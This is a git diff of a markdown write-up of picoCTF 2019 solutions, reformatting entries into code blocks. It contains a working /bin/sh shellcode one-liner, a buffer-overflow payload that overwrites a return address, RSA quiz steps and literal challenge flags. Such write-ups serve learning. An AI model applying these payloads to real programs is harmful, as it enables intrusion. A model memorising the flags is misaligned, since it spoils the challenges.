@@ -1,6 +1,6 @@
 Here are the flags and solutions for some of the challenges of picoCTF 2019
 
-+++
+
 # General
 ***
 
@@ -29,8 +29,9 @@ We can use compare `cmp` cmd
 
 ## handy-shellcode :-  
 shellcode for executing `/bin/sh` from [shell-storm](http://shell-storm.org/shellcode/files/shellcode-811.php)
- >cmd:-  <p>	(echo -en "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80\n"; cat) | ./vuln
-
+ ```
+ (echo -en "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80\n"; cat) | ./vuln
+```
 `picoCTF{h4ndY_d4ndY_sh311c0d3_0b440487}`
 
 
@@ -50,8 +51,9 @@ check the functions (objdump -d ./vuln or inside gdb using 'info functions'). Th
 
 
 ## OverFlow2 :-
->cmd:- <p> python -c "import struct;print 'A' * 188 + struct.pack('<I', 0x080485e6) + '\x00'*4 + struct.pack('<I', 0xDEADBEEF) + struct.pack('<I', 0xC0DED00D)" | ./overflow2
-
+```
+ python -c "import struct;print 'A' * 188 + struct.pack('<I', 0x080485e6) + '\x00'*4 + struct.pack('<I', 0xDEADBEEF) + struct.pack('<I', 0xC0DED00D)" | ./overflow2
+```
 `picoCTF{arg5_and_r3turn5ce5cf61a}`
 
 
@@ -184,10 +186,10 @@ morse code
 
 
 ## rsa-pop-quiz:- 	
-``` 
-https://the-rsa-tron.koorkevani.repl.co/  
- [ n=pxq , totient(n)=(p-1)x(q-1) , create ciphertext using python ="pow(plaintext,e,N)" ]
- finally convert plaintext/numbers [14311663942709674867122208214901970650496788151239520971623411712977120619528460123336291453] to hex using python=  "hex(number)" then hex to ascii online https://www.rapidtables.com/convert/number/hex-to-ascii.html
+> https://the-rsa-tron.koorkevani.repl.co/  
+> [ n=pxq , totient(n)=(p-1)x(q-1) , create ciphertext using python ="pow(plaintext,e,N)" ]
+ finally convert plaintext/numbers [14311663942709674867122208214901970650496788151239520971623411712977120619528460123336291453] to hex using python=  "hex(number)" 
+ > then hex to ascii online https://www.rapidtables.com/convert/number/hex-to-ascii.html
 ```
 `picoCTF{wA8_th4t$_ill3aGal..of4878474}`
 
